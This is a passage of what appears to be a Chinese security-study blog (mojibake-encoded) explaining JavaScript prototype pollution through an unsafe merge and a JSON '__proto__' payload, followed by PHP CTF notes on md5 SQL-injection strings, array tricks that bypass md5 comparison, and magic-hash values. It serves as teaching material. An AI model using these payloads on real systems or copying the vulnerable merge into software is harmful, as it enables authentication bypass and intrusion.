<h2 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»¥ä¸Šè¿°çš„Sonç±»å’ŒFatherç±»ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°sonçš„å±‚æ¬¡ä¸­ï¼Œæ˜¯æœ‰ä¸¤ä¸ª<code>Prototype</code>ï¼Œè¿™å°±æ˜¯åŸå‹é“¾çš„æœ€ç®€å•çš„æ ¼å¼ã€‚æœ€åä¸€ä¸ª<code>Object</code>å°±æ˜¯<code>null</code>ï¼Œä»–åœ¨åŸå‹Fatherç±»çš„åé¢ï¼Œè¿™ä¹Ÿæ˜¯åŸå‹é“¾é»˜è®¤çš„æœ€åä¸€ä¸ªåŸå‹ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼Œå½“æˆ‘åœ¨æ‰“å°<code>$&#123;son.last_name&#125;</code>ï¼Œå¦‚æœåœ¨<code>Fatherç±»</code>ä¸­ä¹Ÿæ²¡æœ‰è¿™ä¸ªå±æ€§ä¼šæ€ä¹ˆæ ·å‘¢ï¼Œé‚£sonå°±ä¼šä¸æ–­çš„é¡ºç€åŸå‹é“¾ä¸€ç›´æ‰¾ä¸‹å»ï¼Œç›´åˆ°<code>null</code></p>
<p>å°±ä¼šæ‰§è¡Œï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">son.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905100719829.png" alt="image-20230905100719829"></p>
<p><code>JavaScript</code>è¿™ç§æŸ¥æ‰¾æœºåˆ¶ï¼Œè¢«ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œ<code>prototype</code>ç»§æ‰¿é“¾ã€‚</p>
<p>ä»¥ä¸Šæ˜¯æœ€åŸºç¡€çš„JavaScripté¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œæˆ‘ä»¬å¹¶ä¸æ·±å…¥ç ”ç©¶æ›´ç»†èŠ‚çš„å†…å®¹ï¼Œåªè¦ç‰¢è®°ä¸‹é¢å‡ ç‚¹å³å¯ï¼š</p>
<blockquote>
<ol>
<li>æ¯ä¸ªæ„é€ å‡½æ•°éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡</li>
<li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code></li>
<li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿</li>
</ol>
</blockquote>
<h1 id="åŸå‹é“¾æ±¡æŸ“æ˜¯ä»€ä¹ˆ"><a href="#åŸå‹é“¾æ±¡æŸ“æ˜¯ä»€ä¹ˆ" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“æ˜¯ä»€ä¹ˆ"></a>åŸå‹é“¾æ±¡æŸ“æ˜¯ä»€ä¹ˆ</h1><p>åœ¨æœ€å¼€å§‹å†™è¿‡<code>foo.__proto__</code>æŒ‡å‘Fooç±»çš„<code>prototype</code>ï¼Œæˆ‘ä»¬ä¹Ÿè¯•è¿‡é€šè¿‡<code>foo.__proto__</code>æ–°å¢ä¸€ä¸ªæ–°å‡½æ•°ï¼Œä¹Ÿå¯ä»¥åŠ åˆ°åŸå‹ä¸­å»ï¼Œå¹¶ä¸”å¯ä»¥æˆåŠŸè°ƒç”¨ä¸æ„é€ å‡½æ•°åŒä¸€å±‚æ¬¡ï¼Œé‚£ä¹ˆå¦‚æœä¿®æ”¹<code>foo.__proto__</code>ä¸­çš„ä¸€äº›å€¼ï¼ŒåŒç†ä¹Ÿå¯ä»¥ä¿®æ”¹Fooç±»ä¸­çš„ä¸€äº›ä¸œè¥¿</p>
<p>æˆ‘ä»¬ç®€å•è¯•ä¸€ä¸‹ï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar æ­¤æ—¶ä¸º1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥çœ‹zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªç®€å•å¯¹è±¡fooï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äºfooå¹¶ä¸æ˜¯æŸä¸ªå…·ä½“ç±»çš„å®ä¾‹ï¼Œä½†æ˜¯æ‰€æœ‰å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå®ä¾‹å­˜åœ¨ï¼Œé‚£å°±<code>Object</code>ç±»</p>
<p>ç„¶åæˆ‘ä»¬å…ˆçœ‹çœ‹ï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905101905435.png" alt="image-20230905101905435"></p>
<p>åŒæ ·å¯ä»¥çœ‹åˆ°<code>foo</code>ç¡®å®å­˜åœ¨ä¸€ä¸ªåŸå‹ï¼Œå¹¶ä¸”ä¸º<code>Object</code>ã€‚</p>
<p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬é€šè¿‡<code>foo.__proto__</code>ä¿®æ”¹åŸå‹ä¸­çš„æŸäº›å€¼å‘¢ï¼Ÿ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡<code>foo.__proto__</code>å°†<code>bar</code>å€¼ä¿®æ”¹ä¸º2ï¼Œ</p>
<p>ç„¶åæ‰“å°çœ‹çœ‹ï¼Œ</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905102214488.png" alt="image-20230905102214488"></p>
<p>çªç„¶å‘ç°ï¼Œæ‰“å°çš„ç»“æœæ˜¯1ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬åˆšæ‰ä¿®æ”¹çš„ç»“æœ2</p>
<p>è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å†æ¬¡çœ‹çœ‹fooå°±çŸ¥é“äº†</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905102456014.png" alt="image-20230905102456014"></p>
<blockquote>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>bar: 1</code>æ˜¯fooè‡ªèº«çš„å±æ€§ï¼Œè€ŒåŸå‹Objectä¸­çš„<code>bar: 2</code>ï¼Œå±‚æ¬¡è¦ä½äºfooè‡ªèº«çš„å±æ€§ï¼Œæ‰€ä»¥ç›¸åŒçš„å±æ€§ï¼Œè¿˜æ˜¯ä»¥è‡ªèº«ä¼˜å…ˆï¼Œä¸å­˜åœ¨æˆ–è€…ä¸å®Œå–„ï¼Œæ‰ä»åŸå‹ä¸­ç»§æ‰¿ï¼Œè¿™å’Œä¸Šé¢è®²çš„Sonç±»å’ŒFatherç±»æ˜¯ä¸€æ ·çš„ã€‚</p>
</blockquote>
<p>æ‰€ä»¥è¿™é‡Œæ‰“å°ç»“æœè¿˜æ˜¯1ï¼Œå°±æ˜¯è¿™ä¸ªåŸå› ã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å†æ–°å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè®©å®ƒå’Œfooä¸€æ ·ï¼ŒåŸå‹ä¹Ÿæ˜¯åªæœ‰<code>Object</code>ï¼Œä½†æ˜¯æ²¡æœ‰barå±æ€§ï¼Œå†æ¬¡æ‰“å°ä¼šæ€ä¹ˆæ ·å‘¢</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905102953845.png" alt="image-20230905102953845"></p>
<p>å¯ä»¥çœ‹åˆ°æ‰“å°ç»“æœä¸º2ï¼Œå› ä¸ºè¿™é‡Œzooå¯¹è±¡æ²¡æœ‰barå±æ€§ï¼Œæ‰€ä»¥è¿™é‡Œzooå°±ç›´æ¥ç»§æ‰¿Objectä¸­barå±æ€§ï¼Œè€ŒObjectæœ¬èº«å¹¶æ²¡æœ‰barå±æ€§ï¼Œæ˜¯fooé€šè¿‡<code>foo.__proto__</code>æ¥æ–°å¢çš„ä¸€ä¸ªå±æ€§ï¼Œå´èƒ½è¾¾åˆ°å½±å“zooå¯¹è±¡çš„ä½œç”¨ã€‚</p>
<blockquote>
<p>é‚£ä¹ˆï¼Œè¿™ç§åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯èƒ½å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€‚çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ”»å‡»</p>
</blockquote>
<h1 id="å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“å‘¢ï¼Ÿ"><a href="#å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“å‘¢ï¼Ÿ" class="headerlink" title="å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“å‘¢ï¼Ÿ"></a>å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“å‘¢ï¼Ÿ</h1><p>æ ¹æ®ä¸Šè¿°å†…å®¹ï¼Œæˆ‘ä»¬å‘ç°å…³é”®åœ¨äºèƒ½å¤Ÿé¡ºåˆ©è°ƒç”¨<code>__proto__</code>å¹¶è®¾ç½®å…¶å€¼å³å¯ï¼Œé‚£ä¹ˆå¦‚ä½•æˆåŠŸå‘¢ï¼Ÿ</p>
<blockquote>
<p>å…³é”®åœ¨äºæ‰¾åˆ°èƒ½å¤Ÿæ§åˆ¶æ•°å­—ã€å¯¹è±¡ã€‘çš„â€œé”®åâ€çš„æ“ä½œå³å¯ï¼š</p>
<ul>
<li>å¯¹è±¡<code>merge</code></li>
<li>å¯¹è±¡<code>clone</code>ï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</li>
</ul>
</blockquote>
<p>ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªé€’å½’å‡½æ•°ï¼Œå®ƒçš„ç›®çš„æ˜¯å°† <code>source</code> å¯¹è±¡ä¸­çš„å±æ€§åˆå¹¶åˆ° <code>target</code> å¯¹è±¡ä¸­ã€‚å®ƒé€šè¿‡éå† <code>source</code> å¯¹è±¡ä¸­çš„æ¯ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå¦‚æœ <code>target</code> å¯¹è±¡ä¸­ä¹Ÿå­˜åœ¨è¿™ä¸ªé”®ï¼Œé‚£ä¹ˆå°±é€’å½’è°ƒç”¨ <code>merge</code> å‡½æ•°å°†ä¸¤ä¸ªå¯¹è±¡ä¸­å¯¹åº”é”®çš„å€¼è¿›è¡Œåˆå¹¶ï¼›å¦åˆ™ï¼Œå°±ç›´æ¥å°† <code>source</code> å¯¹è±¡ä¸­çš„é”®å€¼å¯¹å¤åˆ¶åˆ° <code>target</code> å¯¹è±¡ä¸­ã€‚æœ€ç»ˆï¼Œ<code>target</code> å¯¹è±¡å°†åŒ…å«åŸæ¥çš„å±æ€§ä»¥åŠ <code>source</code> å¯¹è±¡ä¸­çš„æ‰€æœ‰å±æ€§ã€‚è¿™ä¸ªå‡½æ•°é€šå¸¸ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªå¯¹è±¡ï¼Œä»¥ä¾¿äºåœ¨ä¸€ä¸ªå¯¹è±¡ä¸­è®¿é—®æ‰€æœ‰å±æ€§ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨åˆå¹¶æ—¶å­˜åœ¨å¤åˆ¶æ“ä½œ<code>target[key] = source[key]</code>ï¼Œé‚£ä¹ˆå¦‚æœè¿™ä¸ªkeyæ˜¯<code>__proto__</code>ï¼Œæ˜¯å¦å°±å¯ä»¥æˆåŠŸé€ æˆæ±¡æŸ“å‘¢ï¼Ÿ</p>
<p>è¯•ä¸€ä¸‹ï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°o1å’Œo2ç¡®å®æ˜¯åˆå¹¶æˆåŠŸäº†</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905110223841.png" alt="image-20230905110223841"></p>
<p>ä½†æ˜¯æˆ‘ä»¬çš„<code>__proto__</code>ä¸è§äº†ï¼Œå–è€Œä»£ä¹‹å‘ç°å¤šäº†ä¸ª<code>Object</code>åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„<code>__proto__</code>è¢«å½“ä½œo2çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯å…¶è‡ªèº«çš„<code>Object</code>ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å½±å“æœ€åä¸€ä¸ªæ¯ä¸ªå¯¹è±¡å…±æœ‰<code>Object</code>ï¼Œæ‰€ä»¥æ±¡æŸ“æ˜¯æ— æ•ˆçš„</p>
<p>æ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œæ‹¿åˆ°çš„åªè¦[a,b]ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸æ— æ³•ä¿®æ”¹Objectçš„åŸå‹ã€‚</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905110442713.png" alt="image-20230905110442713"></p>
<p>æ‰€æœ‰å½“æˆ‘ä»¬æƒ³ç”¨<code>o3</code>æµ‹è¯•æ˜¯å¦æ±¡æŸ“æ—¶ï¼Œå‘ç°æ˜¯æ²¡æœ‰çš„</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111044306.png" alt="image-20230905111044306"></p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111219362.png" alt="image-20230905111219362"></p>
<p>é‚£ä¹ˆå¦‚ä½•å°†<code>__proto__</code>è¢«å½“ä½œæ˜¯ä¸€ä¸ªé”®åå‘¢ï¼Œåªè¦åŠ ä¸€ä¸ªè§£æå°±è¡Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>

<p>å†çœ‹çœ‹o2çš„æ•°æ®ï¼Œ</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111651534.png" alt="image-20230905111651534"></p>
<p>å‘ç°è¿™æ¬¡<code>__proto__</code>ï¼Œæ²¡æœ‰è¢«å½“ä½œo2çš„åŸå‹äº†ï¼Œè€Œæ˜¯ä¸€ä¸ªé”®å€¼</p>
<p>æ­¤æ—¶å†æ¬¡æ‰“å°o3ï¼Œå‘ç°æˆåŠŸæ±¡æŸ“<code>Object</code></p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111841511.png" alt="image-20230905111841511"></p>
<blockquote>
<p>JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p>
</blockquote>
<p>å¯ä»¥æ˜¯ä¸ºä»€ä¹ˆèƒ½å®ç°å°†å±æ€§bä»¥åŠå…¶å€¼æ±¡æŸ“åˆ°Objectä¸­å‘¢ï¼Ÿ</p>
<p>å…¶å®å¾ˆç®€å•ï¼Œ</p>
<p>æˆ‘ä»¬å®é™…ä¿®æ”¹åŸå‹æ—¶ç”¨çš„è¯­æ³•æ˜¯</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">o2.<span class="property">__proto__</span>.<span class="property">b</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>è€Œè¯»å–æ•°ç»„ä¸­é”®å€¼ä¹Ÿæ˜¯å¦‚æ­¤è¯­æ³•ï¼Œæ‰€ä»¥å½“é”®å€¼ä¸º<code>__proto__</code>æ—¶ï¼Œè°ƒç”¨<code>__proto__</code>å…¶åçš„æ•°æ®å› ä¸ºè¯­æ³•ï¼Œä¼šè¢«å½“ä½œä¿®æ”¹åŸå‹çš„å€¼ï¼Œä»è€Œå®ç°åŸå‹é“¾æ±¡æŸ“çš„ä½œç”¨</p>
<blockquote>
<p>ps. <code>merge</code>æ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ï¼Œå¾ˆå¤šå¸¸è§çš„åº“éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</p>
</blockquote>
<hr>
<blockquote>
<p>æœ€åå¯ä»¥åšä¸€ä¸‹pç¥çš„</p>
<p>Code-Breaking 2018 Thejs</p>
<p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPå‡½æ•°è®°å½•</title>
    <url>//post/php-functions/</url>
    <content><![CDATA[<p><code>è¿˜æ˜¯æŒºé‡è¦çš„</code></p>
<span id="more"></span>

<h1 id="PHPå‡½æ•°è®°å½•"><a href="#PHPå‡½æ•°è®°å½•" class="headerlink" title="PHPå‡½æ•°è®°å½•"></a>PHPå‡½æ•°è®°å½•</h1><h2 id="1-phpå‡½æ•°md5"><a href="#1-phpå‡½æ•°md5" class="headerlink" title="1)phpå‡½æ•°md5"></a>1)phpå‡½æ•°md5</h2><blockquote>
<p>ps.<br>sha1ï¼Œç”±äºæ­¤å‡½æ•°ä¾èµ–çš„ç®—æ³•å·²ä¸è¶³å¤Ÿå¤æ‚,ä¸æ¨èä½¿ç”¨æ­¤å‡½æ•°å¯¹æ˜æ–‡å¯†ç åŠ å¯†ã€‚ç›®å‰å¤§å¤šç”¨md5</p>
<p>ä½†æ˜¯å’Œmd5ä¸€æ ·ï¼Œsha1å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œé‡åˆ°æ•°ç»„ä¼šè¿”å›NULL</p>
</blockquote>
<p>åšé¢˜æ—¶ï¼Œäº†è§£åˆ°äº†ä¸€ä¸ªæ–°çš„å‡½æ•°<code>md5</code></p>
<blockquote>
<p>php md5å‡½æ•°ä»‹ç»ä¸ºï¼š</p>
<p>md5( string , raw )</p>
<p>string : è§„å®šéœ€è¦è®¡ç®—çš„å­—ç¬¦ä¸²</p>
<p>raw : è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ã€‚</p>
<p>â€‹        trueï¼š16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼</p>
<p>â€‹        false(é»˜è®¤): 32å­—ç¬¦åå…­è¿›åˆ¶æ•°</p>
</blockquote>
<p>æ¯”è¾ƒå¸¸ç”¨çš„</p>
<p>æ•°å­—å‹ï¼š<code>129581926211651571912466741651878684928</code></p>
<p><img src="/post/php-functions/image-20220811135742130.png" alt="image-20220811135742130"></p>
<p>å­—ç¬¦å‹ï¼š<code>ffifdyop</code></p>
<p><img src="/post/php-functions/image-20220811135813137.png" alt="image-20220811135813137"></p>
<p>å‘ç°éƒ½æœ‰â€™<code>or</code>â€˜çš„å½¢å¼ï¼Œå¯ä»¥æ„é€ å¿…çœŸçš„ç»“æœ</p>
<blockquote>
<p>MD5å‡½æ•°æœ‰ä¸€ä¸ªæ¼æ´ï¼Œå½“è¾“å…¥çš„ä¸ºæ•°ç»„æ—¶ï¼Œä¼šè¿”å›ä¸ºNULL</p>
<p>æ‰€ä»¥å½“é‡åˆ°md5(p1)&#x3D;&#x3D;&#x3D;md5(p2)ï¼ŒæŠŠp1å’Œp2è¿›è¡Œå¼ºæ¯”è¾ƒæ—¶ï¼Œåˆè¦æ±‚p1å’Œp2ä¸ç›¸ç­‰</p>
<p>ç”±äºä¸¤ä¸ªä¸åŒçš„å­—ç¬¦MD5å€¼å¾ˆéš¾ä¸€è‡´ï¼Œäºæ˜¯è¾“å…¥p1[]å’Œp2[]ä¸¤ä¸ªåå­—ä¸€è‡´çš„å­—ç¬¦ï¼Œéšä¾¿èµ‹å€¼ï¼Œ<br>p1[]&#x3D;1&amp;p2[]&#x3D;2<br>è¿”å›ä¸ºç©ºï¼Œä½¿å¾—å¼ºæ¯”è¾ƒæˆç«‹</p>
<hr>
<p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢<br>æˆ‘æƒ³èµ·ä¹‹å‰çš„é‡åˆ°ä¸€ä¸ªé¢˜ï¼Œä¹Ÿæœ‰æ•°ç»„ï¼Œé—®äº†ä¸€ä¸‹å¤§ä½¬</p>
<p>å¤§ä½¬è¯´ï¼Œå› ä¸ºæ²¡æœ‰å¯¹æ•°ç»„ä¸­çš„å…ƒç´ æ•°é‡å£°æ˜ï¼Œå‡½æ•°ä¸çŸ¥é“æ•°ç»„å…ƒç´ ç¬¬å‡ ä¸ªçš„å€¼æ˜¯1ï¼ˆæˆ–2ï¼‰<br>å¯¼è‡´å‡½æ•°åˆ°å¤„æ‰«ï¼Œæœ€åè¿”å›NULLã€å› ä¸ºè¿™ä¸ªå…ƒç´ ä½ç½®æˆ‘ä»¬æ ¹æœ¬å°±æ²¡å®šã€‘</p>
<p>ä¸‹é¢ä¸¾å‡ ä¸ªä¾‹å­ï¼Œä»¥æˆ‘ä¸ªäººç†è§£<br>å¦‚æœæ˜¯<br>p1[0]&#x3D;1&amp;p2[0]&#x3D;2<br>æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºåªå®šä¹‰äº†0å·ä½çš„æ•°æ®ï¼Œè€Œä¸”ä¸ç›¸ç­‰ï¼Œå…¶ä»–ä½ç½®æ•°æ®æ²¡å®šä¹‰ï¼Œæ‰€ä»¥æ¯”è¾ƒä¹Ÿä¸å¯èƒ½å‡ºç°ç›¸ç­‰</p>
<p>p1[0]&#x3D;1&amp;p2[1]&#x3D;1<br>æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºè¿™é‡Œp1[]å®šä¹‰äº†0å·ä½ä¸º1ï¼Œè€Œp2å®šä¹‰çš„æ˜¯1å·ä½ä¸º1ï¼Œæ¯”è¾ƒæ˜¯æŒ‰é¡ºåºæ¯”è¾ƒçš„ï¼Œä¸¤ä¸ªæ•°å€¼è™½ç„¶ä¸€æ ·ï¼Œä½†æ˜¯ä½ç½®ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æ¯”è¾ƒè¿˜æ˜¯ä¸ç›¸ç­‰</p>
</blockquote>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯<span class="number">0</span>eå¼€å¤´çš„ï¼š</span><br><span class="line"></span><br><span class="line"> QNKCDZO</span><br><span class="line"> <span class="number">240610708</span></span><br><span class="line"> s878926199a</span><br><span class="line"> s155964671a</span><br><span class="line"> s214587387a</span><br><span class="line"> s1091221200a</span><br></pre></td></tr></table></figure>

<h2 id="2-phpå‡½æ•°eregï¼Œnullæˆªæ–­"><a href="#2-phpå‡½æ•°eregï¼Œnullæˆªæ–­" class="headerlink" title="2)phpå‡½æ•°eregï¼Œnullæˆªæ–­"></a>2)phpå‡½æ•°eregï¼Œnullæˆªæ–­</h2><p><strong>æ­¤å‡½æ•°åœ¨ PHP 5.3.0ä¸­å·²å¼ƒç”¨ï¼Œå¹¶åœ¨PHP 7.0.0ä¸­åˆ é™¤ã€‚</strong></p>
